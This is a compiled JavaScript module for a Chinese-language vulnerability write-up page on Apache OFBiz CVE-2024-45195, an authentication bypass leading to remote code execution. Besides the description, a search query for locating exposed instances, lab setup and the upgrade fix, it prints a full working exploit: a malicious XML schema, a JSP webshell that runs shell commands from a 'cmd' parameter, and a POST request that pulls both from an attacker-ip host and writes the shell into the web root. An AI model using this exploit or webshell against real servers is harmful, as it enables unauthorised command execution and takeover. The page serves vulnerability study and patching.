import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c,a as e,b as t,d as n,e as d}from"./app-58e4a7d6.js";const r={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),p=e("p",null,"Apache OFBiz 是一个开源企业资源规划（ERP）系统。它提供了一套企业应用程序，集成并自动化企业的许多业务流程。",-1),u=e("p",null,"该漏洞是由于之前漏洞（CVE-2024-32113、CVE-2024-36104 和 CVE-2024-38856）未完全修复所导致。在 Apache OFBiz 版本 18.12.16 之前，开发人员对这些先前的问题进行了修复，但控制器视图地图状态不同步的根本问题仍然存在。这使得攻击者能够绕过身份验证并访问敏感的仅限管理员的视图地图。",-1),m=e("p",null,"参考链接：",-1),g={href:"https://github.com/apache/ofbiz-framework/commit/ab78769c2d",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa",target:"_blank",rel:"noopener noreferrer"},b={href:"https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/",target:"_blank",rel:"noopener noreferrer"},v=d(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache OFBiz &lt; 18.12.16
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;Apache_OFBiz&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行以下命令启动一个 Apache OfBiz 18.12.15 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/accounting</code> 查看到登录页面，说明环境已启动成功。</p><p>如果非本地 localhost 启动，Headers 需要包含 <code>Host: localhost</code>，否则报错：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ERROR MESSAGE
org.apache.ofbiz.webapp.control.RequestHandlerException: Domain your-ip not accepted to prevent host header injection. 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918161735890.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先在服务器 <code>&lt;attacker-ip&gt;</code> 上部署恶意 XML 文件和 CSV 文件。</p><p>第一个文件是 <code>rceschema.xml</code>，此 XML schema 文件定义了恶意 JSP 的结构：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;data-files xsi:noNamespaceSchemaLocation=&quot;http://ofbiz.apache.org/dtds/datafiles.xsd&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
    &lt;data-file name=&quot;rce&quot; separator-style=&quot;fixed-length&quot; type-code=&quot;text&quot; start-line=&quot;0&quot; encoding-type=&quot;UTF-8&quot;&gt;
        &lt;record name=&quot;rceentry&quot; limit=&quot;many&quot;&gt;
            &lt;field name=&quot;jsp&quot; type=&quot;String&quot; length=&quot;605&quot; position=&quot;0&quot;&gt;&lt;/field&gt;
        &lt;/record&gt;
    &lt;/data-file&gt;
&lt;/data-files&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>第二个文件是 <code>rcereport.csv</code>，此 CSV 文件包含实际的 JSP 代码：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>&lt;%@ page import=&#39;java.io.*&#39; %&gt;&lt;%@ page import=&#39;java.util.*&#39; %&gt;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Ahoy!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>&lt;% String getcmd = request.getParameter(&quot;cmd&quot;); if (getcmd != null) { out.println(&quot;Command: &quot; + getcmd + &quot;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">&gt;</span></span>&quot;); String cmd1 = &quot;/bin/sh&quot;; String cmd2 = &quot;-c&quot;; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %&gt;,
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>然后发送以下请求：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
Host: localhost:8443
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 241
Content-Type: application/x-www-form-urlencoded

DATAFILE_LOCATION=http://&lt;attacker-ip&gt;/rcereport.csv&amp;DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&amp;DATAFILE_IS_URL=true&amp;DEFINITION_LOCATION=http://&lt;attacker-ip&gt;/rceschema.xml&amp;DEFINITION_IS_URL=true&amp;DEFINITION_NAME=rce
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918162601513.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>该请求通过利用 viewdatafile 视图地图将恶意 JSP 文件写入 Web 根目录，从而利用了该漏洞实现远程代码执行。</p><p>在 JSP webshell 被写入后，通过 <code>https://your-ip:8443/accounting/index.jsp?cmd=id</code> 即可执行任意命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240918162620929.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><p>升级至 18.12.16 及以上版本。</p>`,25);function f(_,x){const a=s("ExternalLinkIcon");return o(),c("div",null,[l,p,u,m,e("ul",null,[e("li",null,[e("a",g,[t("https://github.com/apache/ofbiz-framework/commit/ab78769c2d"),n(a)])]),e("li",null,[e("a",h,[t("https://github.com/apache/ofbiz-plugins/commit/8b95fe6fa"),n(a)])]),e("li",null,[e("a",b,[t("https://www.rapid7.com/blog/post/2024/09/05/cve-2024-45195-apache-ofbiz-unauthenticated-remote-code-execution-fixed/"),n(a)])])]),v])}const S=i(r,[["render",f],["__file","Apache OFBiz 身份验证绕过导致远程代码执行 CVE-2024-45195.html.vue"]]);export{S as default};
